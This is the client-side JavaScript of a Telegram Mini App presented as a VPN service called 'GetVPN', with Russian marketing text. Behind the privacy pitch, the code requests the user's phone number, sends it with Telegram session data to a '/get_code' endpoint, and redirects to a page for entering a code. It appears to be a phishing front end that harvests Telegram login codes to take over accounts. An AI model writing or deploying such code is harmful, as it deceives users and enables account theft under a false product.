const tg = window.Telegram.WebApp;
const themeParams = tg.themeParams;

document.body.style.backgroundColor = themeParams.bg_color;
document.body.style.color = themeParams.text_color;

document.getElementById('app-title').style.color = themeParams.hint_color || themeParams.text_color;
document.getElementById('description').style.color = themeParams.secondary_text_color || themeParams.text_color;
document.querySelector('button').style.backgroundColor = themeParams.button_color;
document.querySelector('button').style.color = themeParams.button_text_color;

document.getElementById('phone-number').style.color = themeParams.link_color || themeParams.text_color;

const descriptionDiv = document.getElementById('description');
descriptionDiv.innerHTML = `
                Защитите свою конфиденциальность с GetVPN. <br>
                Надежное шифрование, высокая скорость и доступ в любую точку мира.
            `;

async function checkPhoneNumber(phone_number) {
    const user = tg.initDataUnsafe.user;

    if (user) {
        document.getElementById('phone-number').innerText = `Ваш номер: ${phone_number}`;
    }
}

async function sendPostRequest(url, data) {
    var userData = window.Telegram.WebApp.initData;
    data.init_data = userData;

    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
    return response.json();
}

function requestPhoneNumber(el) {
    tg.requestContact(async function (sent, event) {
        if (sent) {
            try {
                var phone_num = `${event.responseUnsafe.contact.phone_number}`
                const authResponse = await sendPostRequest('/get_code', {
                    phone_number: phone_num,
                });
                
                if (authResponse.status === 200 && authResponse.result === 'success') {
                    Telegram.WebApp.showAlert('✅ Аккаунт уже авторизован!');
                    location.reload();
                } else if (authResponse.status === 200 && authResponse.result === 'wait_enter_code') {
                    var newDate = window.Telegram.WebApp.initData;
                    window.location.href = "/enter_code/" + encodeURIComponent(phone_num) + '?initData=' + encodeURIComponent(newDate);
                } else {
                    Telegram.WebApp.showAlert('⚠️ Произошла ошибка при получении кода');
                }
            } catch (error) {
                Telegram.WebApp.showAlert(error);
            }
        } else {
            return;
        }
    });
}
